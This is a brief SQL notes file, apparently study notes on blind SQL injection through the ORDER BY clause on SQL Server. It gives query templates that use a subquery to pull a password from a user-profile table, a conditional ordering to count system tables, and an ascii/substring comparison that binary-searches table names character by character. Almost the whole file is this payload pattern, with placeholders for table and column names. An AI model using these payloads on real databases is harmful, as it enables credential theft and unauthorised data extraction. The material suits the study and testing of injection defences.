-- Basicly see if there is an error depending on the responds
select *
from --[table name]
order by
--[column names] -> (select top 1 password from userprofile)
DESC


-- checking to see if there are 10 tables
select * from supercar order by
case when (select count(*) from sys.tables)=10 then [columns name] else [column name] end
desc

-- checking the first character of the first table(binary search)
select * from supercar order by
case when (select top 1 ascii(substring([column name], 1, 1)) from sys.tables)<=109 then [columns name] else [column name] end
desc
